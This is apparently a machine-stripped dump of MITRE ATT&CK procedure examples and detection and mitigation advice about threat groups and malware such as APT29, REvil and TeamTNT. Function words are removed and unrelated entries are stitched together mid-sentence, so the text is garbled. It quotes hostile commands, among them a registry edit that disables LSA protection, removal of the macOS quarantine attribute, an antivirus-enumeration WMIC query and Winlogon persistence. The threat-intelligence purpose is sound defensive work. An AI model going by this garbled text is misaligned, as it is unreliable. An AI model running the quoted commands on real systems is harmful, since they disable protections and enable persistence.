2017) [Conti](https://attack.mitre.org/software/S0575) utilize command options attacker control scans encrypts files.(Citation: CarbonBlack Conti July 2020)(Citation: DFIR Conti Bazar Nov 2021) [Epic](https://attack.mitre.org/software/S0091) heavily obfuscates code analysis difficult.(Citation: Kaspersky Turla) [Amadey](https://attack.mitre.org/software/S1025) C2 communications.(Citation: BlackBerry Amadey 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) acquired variety malware, including [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: TrendMicro EarthLusca 2022) [Magic Hound](https://attack.mitre.org/groups/G0059) malware function determine C2 server wishes execute newly dropped file hidden window.(Citation: Unit 42 Magic Hound Feb 2017) (Citation: Volexity InkySquid BLUELIGHT August 2021) [GravityRAT](https://attack.mitre.org/software/S0237) non-standard port, TCP port 46769.(Citation: Talos GravityRAT) Monitor windows registry values target multi-factor authentication mechanisms, smart cards, gain access credentials access systems, services, network resources. (Citation: MalwareBytes LazyScripter Feb 2021) PowerShell necessary, restrict PowerShell execution policy administrators. aware methods bypassing PowerShell execution policy, depending environment configuration.(Citation: Netspi PowerShell Execution Policy Bypass) Limit credential overlap accounts systems training users administrators password multiple accounts. Collect analyze signing certificate metadata check signature validity software executes environment, invalid signatures unusual certificate characteristics outliers. module [Prikormka](https://attack.mitre.org/software/S0113) collects paths, size, creation time files specific file extensions, actual content file.(Citation: ESET Operation Groundbait) [APT29](https://attack.mitre.org/groups/G0016) sticky-keys unauthenticated, privileged console access.(Citation: Mandiant Easy Breach)(Citation: FireEye APT29 Domain Fronting) [SILENTTRINITY](https://attack.mitre.org/software/S0692)'s `credphisher.py` module prompt current user credentials.(Citation: GitHub SILENTTRINITY Modules July 2019) multi-factor authentication user privileged accounts. [Magic Hound](https://attack.mitre.org/groups/G0059) disabled LSA protection compromised hosts `"reg" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f`.(Citation: DFIR Report APT35 ProxyShell March 2022) [APT37](https://attack.mitre.org/groups/G0067) audio capturing utility SOUNDWAVE captures microphone input.(Citation: FireEye APT37 Feb 2018) [Stuxnet](https://attack.mitre.org/software/S0603) infects remote servers network shares infecting WinCC database views malicious code.(Citation: Symantec W.32 Stuxnet Dossier) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [DarkWatchman](https://attack.mitre.org/software/S0673) icon mimicking file mask malicious executable.(Citation: Prevailion DarkWatchman 2021) [MacSpy](https://attack.mitre.org/software/S0282) capture screenshots desktop multiple monitors.(Citation: objsee mac malware 2017) [ChChes](https://attack.mitre.org/software/S0144) copies .exe file filename intended imitate Norton Antivirus letters reversed (e.g. notron.exe).(Citation: PWC Cloud Hopper Technical Annex April 2017) [MacSpy](https://attack.mitre.org/software/S0282) captures keystrokes.(Citation: objsee mac malware 2017) C2 HTTP, [Helminth](https://attack.mitre.org/software/S0170) encodes data base64 sends "Cookie" field requests. C2 DNS, [Helminth](https://attack.mitre.org/software/S0170) converts ASCII characters hexadecimal values sends data cleartext.(Citation: Palo Alto OilRig 2016) Monitor newly constructed processes command-lines execute logon scripts [BITTER](https://attack.mitre.org/groups/G1002) scheduled tasks persistence execution.(Citation: Cisco Talos Bitter Bangladesh 2022) [Kerrdown](https://attack.mitre.org/software/S0585) gained execution victims malicious files.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019) [DEATHRANSOM](https://attack.mitre.org/software/S0616) enumerate logical drives target system.(Citation: FireEye FiveHands April 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), attackers signed kernel rootkit establish additional persistence.(Citation: Cybereason OperationCuckooBees 2022) [SILENTTRINITY](https://attack.mitre.org/software/S0692) keylogging capability.(Citation: GitHub SILENTTRINITY Modules July 2019) [Netwalker](https://attack.mitre.org/software/S0457) terminate processes services, relate backup software.(Citation: TrendMicro Netwalker 2020) Restrict storage execution SIP DLLs protected directories, C:\\Windows, user directories. Limit permissions creating instances privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies.(Citation: Mandiant M-Trends 2020) Monitor executed commands arguments attempt exfiltrate data network medium command control channel [Zeus Panda](https://attack.mitre.org/software/S0330) decrypts strings code execution process.(Citation: Talos Zeus Panda Nov 2017) [APT29](https://attack.mitre.org/groups/G0016) Ticket Granting Service (TGS) tickets Active Directory Service Principle Names crack offline.(Citation: Deep Dive Solorigate January 2021) Monitor extracted list firewalls settings/rules (ex: Azure Network Firewall CLI commands) Ensure Domain Controller backups properly secured.(Citation: Metcalf 2015) [APT19](https://attack.mitre.org/groups/G0073) publicly-available tools [Empire](https://attack.mitre.org/software/S0363).(Citation: NCSC Joint Report Public Tools)(Citation: FireEye APT19) [Remsec](https://attack.mitre.org/software/S0125) plugin perform ARP scanning port scanning.(Citation: Kaspersky ProjectSauron Technical Analysis) Monitor attempts access files store certificates private keys. example, personal certificates users stored disk folders `%APPDATA%\Microsoft\SystemCertificates\My\Certificates\`.(Citation: SpecterOps Certified Pre Owned)(Citation: O365 Blog Azure Device IDs) [APT33](https://attack.mitre.org/groups/G0064) TCP ports 808 880 command control.(Citation: Symantec Elfin Mar 2019) [Melcoz](https://attack.mitre.org/software/S0530) spread malicious links embedded e-mails.(Citation: Securelist Brazilian Banking Malware July 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SierraAlfa accesses <code>ADMIN$</code> share SMB conduct lateral movement.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [USBferry](https://attack.mitre.org/software/S0452) <code>netstat</code> <code>nbtstat</code> detect active network connections.(Citation: TrendMicro Tropic Trooper 2020)	 [Ebury](https://attack.mitre.org/software/S0377) exfiltrate SSH credentials custom DNS queries.(Citation: ESET Windigo Mar 2014) [AuditCred](https://attack.mitre.org/software/S0347) installed service system.(Citation: TrendMicro Lazarus Nov 2018) [Winnti Group](https://attack.mitre.org/groups/G0044) registered domains C2 mimicked sites intended targets.(Citation: Kaspersky Winnti April 2013) blocking container file types email gateways. unregistering container file extensions Windows File Explorer.(Citation: Dormann Dangers VHD 2019) [admin@338](https://attack.mitre.org/groups/G0018) actors command exploitation machine [LOWBALL](https://attack.mitre.org/software/S0042) malware services: <code>net start >> %temp%\download</code>(Citation: FireEye admin@338) [FunnyDream](https://attack.mitre.org/software/S1044) FilePakMonitor component ability collect files removable devices.(Citation: Bitdefender FunnyDream Campaign November 2020) [Chrommme](https://attack.mitre.org/software/S0667) retrieve username targeted system.(Citation: ESET Gelsemium June 2021) [TinyTurla](https://attack.mitre.org/software/S0668) HTTPS C2 communications.(Citation: Talos TinyTurla September 2021) [Carbon](https://attack.mitre.org/software/S0335) list processes victim’s machine.(Citation: ESET Carbon Mar 2017) [CORESHELL](https://attack.mitre.org/software/S0137) obfuscates strings custom stream cipher.(Citation: FireEye APT28) [ChChes](https://attack.mitre.org/software/S0144) collects process identifier (PID) victim.(Citation: Palo Alto menuPass Feb 2017) (Citation: Talos NavRAT 2018) [Okrum](https://attack.mitre.org/software/S0439) time compromised system.(Citation: ESET Okrum July 2019) Monitor executed commands arguments erase contents storage devices specific systems network interrupt availability network resources. [adbupd](https://attack.mitre.org/software/S0202) OpenSSL library encrypt C2 traffic.(Citation: PLATINUM April 2016) [ThiefQuest](https://attack.mitre.org/software/S0595) function named <code>is_debugging</code> perform anti-debugging logic. function invokes <code>sysctl</code> checking returned <code>P_TRACED</code>. [ThiefQuest](https://attack.mitre.org/software/S0595) calls <code>ptrace</code> <code>PTRACE_DENY_ATTACH</code> flag prevent debugging.(Citation: wardle evilquest partii) [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers retrieve files.(Citation: Symantec Pasam 2012) [NOKKI](https://attack.mitre.org/software/S0353) Windows SetWindowsHookEx injecting GUI process running victim's machine.(Citation: Unit 42 NOKKI Sept 2018) opportunities detect hijacking searching Registry references replaced Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing binary paths unknown paths malicious content. third-party applications define user objects, presence objects HKEY_CURRENT_USER\Software\Classes\CLSID\ anomalous investigated user objects loaded prior machine objects HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\.(Citation: Elastic Hijacking) Registry entries existing objects change infrequently. entry path binary replaced changed unusual unknown binary location, suspicious behavior investigated. [FYAnti](https://attack.mitre.org/software/S0628) ConfuserEx pack .NET module.(Citation: Securelist APT10 March 2021) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors WMI load [Cobalt Strike](https://attack.mitre.org/software/S0154) additional hosts compromised network.(Citation: DFIR Conti Bazar Nov 2021) [APT28](https://attack.mitre.org/groups/G0007) regularly deploys publicly (ex: [Mimikatz](https://attack.mitre.org/software/S0002)) custom password retrieval tools victims.(Citation: ESET Sednit 2)(Citation: DOJ GRU Indictment Jul 2018) dumped LSASS process memory MiniDump function.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) (Citation: Cybereason Cobalt Kitty 2017) [Kerrdown](https://attack.mitre.org/software/S0585) gained execution victims malicious links.(Citation: Amnesty Intl. Ocean Lotus February 2021) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) command <code>xattr -d com.apple.quarantine</code> remove quarantine file attribute Gatekeeper.(Citation: Trend Micro MacOS Backdoor November 2020)(Citation: 20 macOS Common Tools Techniques) [APT3](https://attack.mitre.org/groups/G0022) downloader establishes SOCKS5 connections separate IP addresses TCP port 1913 TCP port 81.(Citation: FireEye Operation Double Tap) Limit permissions discover cloud accounts privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies. [Mosquito](https://attack.mitre.org/software/S0256) establishes persistence Registry key <code>HKCU\Software\Run auto_update</code>.(Citation: ESET Turla Mosquito Jan 2018) [Flagpro](https://attack.mitre.org/software/S0696) execute <code>netstat -ano</code> compromised host.(Citation: NTT Security Flagpro December 2021) [REvil](https://attack.mitre.org/software/S0496) mark binary code deletion reboot.(Citation: Intel 471 REvil March 2020) [FELIXROOT](https://attack.mitre.org/software/S0267) executes batch scripts victim’s machine, launch reverse command execution.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) Monitor command history files, ConsoleHost_history.txt, ~/.zsh_history, ~/.bash_history, unexpected modifications contents, access permissions, attributes. Monitor executed commands arguments actions gather time time zone local remote system. [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) screenshot victim's desktop, named "Filter3.jpg", stored local directory.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Cobalt Group](https://attack.mitre.org/groups/G0080) Ammyy Admin tool TeamViewer remote access, including preserve remote access Cobalt Strike module lost.(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) [admin@338](https://attack.mitre.org/groups/G0018) attempted victims launch malicious Word attachments delivered spearphishing emails.(Citation: FireEye admin@338) [Turian](https://attack.mitre.org/software/S0647) disguise legitimate service blend normal operations.(Citation: ESET BackdoorDiplomacy Jun 2021) Monitor executed commands arguments attempt local permission settings. [KGH_SPY](https://attack.mitre.org/software/S0526) send file victim C2.(Citation: Cybereason Kimsuky November 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) `curl` command send credentials `curl` `wget` commands download software.(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Cisco Talos Intelligence Group) [TeamTNT](https://attack.mitre.org/groups/G0139) custom user agent header scripts.(Citation: Trend Micro TeamTNT) [Bisonal](https://attack.mitre.org/software/S0268) check time set infected host.(Citation: Kaspersky CactusPete Aug 2020) [RogueRobin](https://attack.mitre.org/software/S0270) command named <code>$screenshot</code> responsible screenshots victim machine.(Citation: Unit 42 DarkHydrus July 2018) [Dacls](https://attack.mitre.org/software/S0497) scan directories compromised host.(Citation: TrendMicro macOS Dacls 2020) auditing tools capable detecting folder permissions abuse opportunities systems, reviewing folders third-party software. [APT3](https://attack.mitre.org/groups/G0022) tool detect existence remote systems.(Citation: Symantec Buckeye)(Citation: FireEye Clandestine Fox) [Astaroth](https://attack.mitre.org/software/S0373) creates startup item persistence. (Citation: Cofense Astaroth Sept 2018) (Citation: Dell TG-3390)(Citation: Trend Micro DRBControl February 2020) [KONNI](https://attack.mitre.org/software/S0356) capability perform keylogging.(Citation: Talos Konni 2017) [APT29](https://attack.mitre.org/groups/G0016) compromised email accounts enable phishing campaigns.(Citation: ANSSI Nobelium Phishing December 2021) [PLATINUM](https://attack.mitre.org/groups/G0068) spearphishing emails attachments victims primary initial access vector.(Citation: PLATINUM April 2016) Analysis [Daserf](https://attack.mitre.org/software/S0187) regularly undergoes technical improvements evade anti-virus detection.(Citation: Trend Micro Daserf Nov 2017) Monitor pre-OS boot mechanisms manipulated malicious purposes. snapshots boot records firmware compare images. Log boot records, BIOS, EFI [C0015](https://attack.mitre.org/campaigns/C0015), threat actors commands `net view /all /domain` `ping` discover remote systems. PowerView's PowerShell Invoke-ShareFinder script file share enumeration.(Citation: DFIR Conti Bazar Nov 2021) [SeaDuke](https://attack.mitre.org/software/S0053) module execute Mimikatz PowerShell perform [Pass Ticket](https://attack.mitre.org/techniques/T1550/003).(Citation: Symantec Seaduke 2015) Monitor executed commands arguments attempt exfiltrate data USB connected physical device. [Regin](https://attack.mitre.org/software/S0019) malware platform ICMP communicate infected computers.(Citation: Kaspersky Regin) [StrongPity](https://attack.mitre.org/software/S0491) install service execute service.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [Winnti Windows](https://attack.mitre.org/software/S0141) implant file named ASPNET_FILTER.DLL, mimicking legitimate ASP.NET ISAPI filter DLL name.(Citation: Winnti Jan 2017) [Wingbird](https://attack.mitre.org/software/S0176) performs multiple process injections hijack processes execute malicious code.(Citation: SIR 21) [APT41](https://attack.mitre.org/groups/G0096) RDP lateral movement.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [SUGARDUMP](https://attack.mitre.org/software/S1042) encrypted collected data AES CBC mode encoded Base64.(Citation: Mandiant UNC3890 Aug 2022) [OutSteel](https://attack.mitre.org/software/S1017) identify running processes compromised host.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [PipeMon](https://attack.mitre.org/software/S0501) establish persistence registering malicious DLL alternative Print Processor loaded print spooler service starts.(Citation: ESET PipeMon 2020) [KeyBoy](https://attack.mitre.org/software/S0387) issues command <code>reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”</code> achieve persistence.(Citation: PWC KeyBoys Feb 2017) (Citation: CitizenLab KeyBoy Nov 2016) Hashing binaries service executables detect replacement historical data. Monitor unexpected files manipulated data manipulate external outcomes hide activity [PowerSploit](https://attack.mitre.org/software/S0194) modules written executed [PowerShell](https://attack.mitre.org/techniques/T1086).(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [KGH_SPY](https://attack.mitre.org/software/S0526) perform keylogging polling <code>GetAsyncKeyState()</code> function.(Citation: Cybereason Kimsuky November 2020) removing local Administrators list allowed log RDP. (Citation: District Court Indictment GRU Unit 74455 October 2020) [APT37](https://attack.mitre.org/groups/G0067) executes shellcode VBA script decode Base64 strings.(Citation: Talos Group123) [BITTER](https://attack.mitre.org/groups/G1002) TCP C2 communications.(Citation: Forcepoint BITTER Pakistan Oct 2016) [PoetRAT](https://attack.mitre.org/software/S0428) registry key <RUN> hive persistence.(Citation: Talos PoetRAT April 2020) application control configured block execution CMSTP.exe required network prevent potential misuse adversaries. [APT41](https://attack.mitre.org/groups/G0096) exploited CVE-2020-10189 Zoho ManageEngine Desktop Central, CVE-2019-19781 compromise Citrix Application Delivery Controllers (ADC) gateway devices.(Citation: FireEye APT41 March 2020) [SysUpdate](https://attack.mitre.org/software/S0663) manage services processes.(Citation: Trend Micro Iron Tiger April 2021) Limit access root account prevent users creating modifying systemd timer unit files.  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors spearphishing emails malicious link.(Citation: Cylance Dust Storm) Monitor newly executed processes process executable paths named partial directories. [Patchwork](https://attack.mitre.org/groups/G0040) collected victim name, OS version, architecture type C2 server. [Patchwork](https://attack.mitre.org/groups/G0040) enumerated drives victim's machine.(Citation: Cymmetria Patchwork)(Citation: TrendMicro Patchwork Dec 2017) [Rocke](https://attack.mitre.org/groups/G0106) executed wget curl commands Pastebin HTTPS protocol.(Citation: Anomali Rocke March 2019) [PlugX](https://attack.mitre.org/software/S0013) API hashing modify names strings evade detection.(Citation: Trend Micro DRBControl February 2020)(Citation: Proofpoint TA416 Europe March 2022) Monitor modification files (especially DLLs webservers) abused malicious ISAPI extensions/filters IIS modules. <code>%windir%\system32\inetsrv\config\applicationhost.config</code> IIS module installation.(Citation: IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021) [Imminent Monitor](https://attack.mitre.org/software/S0434) dynamic debugging feature check located %TEMP% directory, copies there.(Citation: QiAnXin APT-C-36 Feb2019) [BitPaymer](https://attack.mitre.org/software/S0570) set values Registry execution.(Citation: Crowdstrike Indrik November 2018)  [HAWKBALL](https://attack.mitre.org/software/S0391) ability delete files.(Citation: FireEye HAWKBALL Jun 2019)	 [LAPSUS$](https://attack.mitre.org/groups/G1004) purchased credentials session tokens criminal underground forums.(Citation: MSTIC DEV-0537 Mar 2022) [Threat Group-3390](https://attack.mitre.org/groups/G0027) deleted existing logs exfiltrated file archives victim.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Trend Micro DRBControl February 2020) [BackConfig](https://attack.mitre.org/software/S0475) custom routine decrypt strings.(Citation: Unit 42 BackConfig 2020) Monitor internal websites unplanned content changes. (Citation: SentinelOne Lazarus macOS July 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) searched unsecured AWS credentials Docker API credentials.(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors code external public-facing IPv4 address compromised host.(Citation: DFIR Conti Bazar Nov 2021)  [Emotet](https://attack.mitre.org/software/S0367) observed injecting Explorer.exe processes. (Citation: Picus Emotet Dec 2018)(Citation: Trend Micro Banking Malware Jan 2019)(Citation: US-CERT Emotet Jul 2018) [Stuxnet](https://attack.mitre.org/software/S0603) xp_cmdshell store execute SQL code.(Citation: Symantec W.32 Stuxnet Dossier) [SUNBURST](https://attack.mitre.org/software/S0559) delivered payloads, including [TEARDROP](https://attack.mitre.org/software/S0560) instance.(Citation: FireEye SUNBURST Backdoor December 2020) [IronNetInjector](https://attack.mitre.org/software/S0581) obfuscate variable names, encrypt strings, base64 encode Rijndael encrypt payloads.(Citation: Unit 42 IronNetInjector February 2021 ) [Gamaredon Group](https://attack.mitre.org/groups/G0047) attempted users Office attachments malicious macros embedded.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022)(Citation: Secureworks IRON TILDEN Profile) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors collected list installed software infected system.(Citation: FoxIT Wocao December 2019) [TrickBot](https://attack.mitre.org/software/S0266) establishes persistence Startup folder.(Citation: ESET Trickbot Oct 2020) Monitor Registry correlate software, patch cycles, etc. Tools Sysinternals Autoruns detect attempts persistence, including listing keys' Registry locations. (Citation: TechNet Autoruns) [Kimsuky](https://attack.mitre.org/groups/G0094) set auto-forward rules victim's e-mail accounts.(Citation: CISA AA20-301A Kimsuky) [RemoteUtilities](https://attack.mitre.org/software/S0592) Msiexec install service.(Citation: Trend Micro Muddy Water March 2021) [Silent Librarian](https://attack.mitre.org/groups/G0122) compromised credentials unauthorized access online accounts.(Citation: DOJ Iran Indictments March 2018) [Sandworm Team](https://attack.mitre.org/groups/G0034) [BlackEnergy](https://attack.mitre.org/software/S0089) KillDisk component overwrite files Windows-based Human-Machine Interfaces. (Citation: US-CERT Ukraine Feb 2016)(Citation: ESET Telebots June 2017) embedded network devices capable storing passwords local accounts plain-text encrypted formats.  Ensure that, available, local passwords encrypted, vendor recommendations.(Citation: Cisco IOS Software Integrity Assurance - AAA) Monitor executed commands arguments leveraging resource forks, malicious activity creating network connections. [Action RAT](https://attack.mitre.org/software/S1028) identify AV products infected host command: `cmd.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct displayName /Format:List`.(Citation: MalwareBytes SideCopy Dec 2021) [Siloscape](https://attack.mitre.org/software/S0623) checks Kubernetes node permissions.(Citation: Unit 42 Siloscape Jun 2021) [HEXANE](https://attack.mitre.org/groups/G1001) PowerShell-based keylogging tool capture window title.(Citation: SecureWorks August 2019) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors MSbuild execute actor-created file.(Citation: Talos Frankenstein June 2019) [Saint Bot](https://attack.mitre.org/software/S1018) relied users malicious link delivered spearphishing.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [UNC2452](https://attack.mitre.org/groups/G0118) forged <code>duo-sid</code> cookie bypass MFA set email account.(Citation: Volexity SolarWinds) [Chimera](https://attack.mitre.org/groups/G0114) RDP access targeted systems.(Citation: Cycraft Chimera April 2020) [TrickBot](https://attack.mitre.org/software/S0266) HTTPS communicate C2 servers, malware updates, modules perform malware logic configuration files.(Citation: S2 Grupo TrickBot June 2017)(Citation: Cyberreason Anchor December 2019) [Dridex](https://attack.mitre.org/software/S0384) relied users clicking malicious attachment delivered spearphishing.(Citation: Checkpoint Dridex Jan 2021) [SUNBURST](https://attack.mitre.org/software/S0559) source code generic variable names pre-obfuscated strings, sanitized developer comments [SUNSPOT](https://attack.mitre.org/software/S0562).(Citation: CrowdStrike SUNSPOT Implant January 2021)  [Egregor](https://attack.mitre.org/software/S0554) inject payload iexplore.exe process.(Citation: Cyble Egregor Oct 2020) [QakBot](https://attack.mitre.org/software/S0650) <code>netstat</code> enumerate current network connections.(Citation: Kaspersky QakBot September 2021) [Zeus Panda](https://attack.mitre.org/software/S0330) searches specific directories victim’s machine.(Citation: GDATA Zeus Panda June 2017) vendors embedded network devices provide cryptographic signing ensure integrity operating images boot time.  Implement available, vendor guidelines. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) [REvil](https://attack.mitre.org/software/S0496) vssadmin delete volume shadow copies bcdedit disable recovery features.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: Talos Sodinokibi April 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks REvil September 2019)(Citation: Tetra Defense Sodinokibi March 2020) (Citation: Unit42 SilverTerrier 2018) [PROMETHIUM](https://attack.mitre.org/groups/G0056) watering hole attacks deliver malicious versions legitimate installers.(Citation: Bitdefender StrongPity June 2020) [Proton](https://attack.mitre.org/software/S0279) zips files exfiltrating them.(Citation: objsee mac malware 2017) [Net Crawler](https://attack.mitre.org/software/S0056) Windows admin shares establish authenticated sessions remote systems SMB lateral movement.(Citation: Cylance Cleaver) [Cyclops Blink](https://attack.mitre.org/software/S0687) ability execute device startup, modified RC script named S51armled.(Citation: NCSC Cyclops Blink February 2022) [Chaes](https://attack.mitre.org/software/S0631) capture screenshots infected machine.(Citation: Cybereason Chaes Nov 2020) [Pupy](https://attack.mitre.org/software/S0192) Lazagne harvesting credentials.(Citation: GitHub Pupy) [MuddyWater](https://attack.mitre.org/groups/G0069) PowerShell execution.(Citation: FireEye MuddyWater Mar 2018)(Citation: MuddyWater TrendMicro June 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Talos MuddyWater 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022) Monitor cloud logs modification creation security firewall rules. Scan public code repositories exposed credentials sensitive commits. Ensure leaked credentials removed commit history, current version code. [Winnti Group](https://attack.mitre.org/groups/G0044) looked specific process running infected servers.(Citation: Kaspersky Winnti April 2013) [OilRig](https://attack.mitre.org/groups/G0049) types scripting execution.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig ISMAgent July 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Unit42 OilRig Nov 2018) version [XTunnel](https://attack.mitre.org/software/S0117) introduced July 2015 obfuscated binary opaque predicates techniques attempt obfuscate bypass security products.(Citation: ESET Sednit 2) Network intrusion detection prevention systems network signatures identify traffic specific protocols, TFTP, mitigate activity network level. Signatures unique indicators protocols based specific technique adversary tool, network configurations.   [PowerPunch](https://attack.mitre.org/software/S0685) volume serial target host generate unique XOR key stage payload.(Citation: Actinium February 2022) (Citation: Citizen Lab Group5) Collect events Registry key creation Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Page) [KOMPROGO](https://attack.mitre.org/software/S0156) capable running WMI queries.(Citation: FireEye APT32 2017) [HAFNIUM](https://attack.mitre.org/groups/G0125) exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065  compromise on-premises versions Exchange Server, enabling access email accounts installation additional malware.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)(Citation: FireEye Exchange Days March 2021)(Citation: Tarrask scheduled task)    [MuddyWater](https://attack.mitre.org/groups/G0069) services including OneHub distribute remote access tools.(Citation: Anomali Static Kitten February 2021) [Goopy](https://attack.mitre.org/software/S0477) impersonated legitimate goopdate.dll, dropped target legitimate GoogleUpdate.exe.(Citation: Cybereason Cobalt Kitty 2017) Monitor newly constructed files abuse resource forks hide malicious code executables evade detection bypass security applications. [EvilBunny](https://attack.mitre.org/software/S0396) observed querying installed antivirus software.(Citation: Cyphort EvilBunny Dec 2014) [Felismus](https://attack.mitre.org/software/S0171) download files remote servers.(Citation: Forcepoint Felismus Mar 2017) Monitor files accessed exfiltrate data code repository primary command control channel. [Rover](https://attack.mitre.org/software/S0090) automatically searches files local drives based predefined list file extensions.(Citation: Palo Alto Rover) [Mustang Panda](https://attack.mitre.org/groups/G0129) additional filename extension hide true file type.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019) [Shark](https://attack.mitre.org/software/S1019) DNS C2 communications.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) Monitor unusual/suspicious driver activity, EDR drivers security tools abused disable security products. [QakBot](https://attack.mitre.org/software/S0650) ability create scheduled tasks persistence.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020) [SMOKEDHAM](https://attack.mitre.org/software/S0649) <code>net.exe user</code> <code>net.exe users</code> enumerate local accounts compromised host.(Citation: FireEye SMOKEDHAM June 2021) [Valak](https://attack.mitre.org/software/S0476) <code>wmic process create</code> scheduled task launch plugins execution.(Citation: SentinelOne Valak June 2020) [Chimera](https://attack.mitre.org/groups/G0114) registered alternate phone compromised users intercept 2FA codes SMS.(Citation: NCC Chimera January 2021) [FIN4](https://attack.mitre.org/groups/G0085) accessed hijacked online email communications stolen credentials.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) Windows 10, enable Attack Surface Reduction (ASR) rules prevent [Visual Basic](https://attack.mitre.org/techniques/T1059/005) [JavaScript](https://attack.mitre.org/techniques/T1059/007) scripts executing malicious downloaded content (Citation: win10_asr). [PolyglotDuke](https://attack.mitre.org/software/S0518) steganography hide C2 images.(Citation: ESET Dukes October 2019) [Darkhotel](https://attack.mitre.org/groups/G0012) spearphishing emails attempt lure users clicking malicious attachments.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) acquired domains imitating legitimate sites.(Citation: Kaspersky Ferocious Kitten Jun 2021) [APT33](https://attack.mitre.org/groups/G0064) compromised Office 365 accounts tandem [Ruler](https://attack.mitre.org/software/S0358) attempt gain control endpoints.(Citation: Holmium June 2020) Monitor newly executed processes execute malicious payloads hijacking vulnerable file path references. disabling embedded files Office programs, OneNote, Protected View.(Citation: Enigma Reviving DDE Jan 2018)(Citation: GitHub Disable DDEAUTO Oct 2017) [POWERSTATS](https://attack.mitre.org/software/S0223) retrieve screenshots compromised hosts.(Citation: FireEye MuddyWater Mar 2018)(Citation: TrendMicro POWERSTATS V3 June 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) communicate C2 POST requests.(Citation: Secureworks Karagany July 2019) [UBoatRAT](https://attack.mitre.org/software/S0333) encrypts instructions payload simple XOR cipher.(Citation: PaloAlto UBoatRAT Nov 2017) [Sandworm Team](https://attack.mitre.org/groups/G0034) created VBScripts SSH server.(Citation: ESET BlackEnergy Jan 2016)(Citation: ESET Telebots Dec 2016)(Citation: ESET Telebots June 2017)(Citation: Dragos Crashoverride 2018)  [SpicyOmelette](https://attack.mitre.org/software/S0646) check presence 29 antivirus tools.(Citation: Secureworks GOLD KINGSWOOD September 2018) (Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018) [Kobalos](https://attack.mitre.org/software/S0641)'s authentication key exchange performed RSA-512.(Citation: ESET 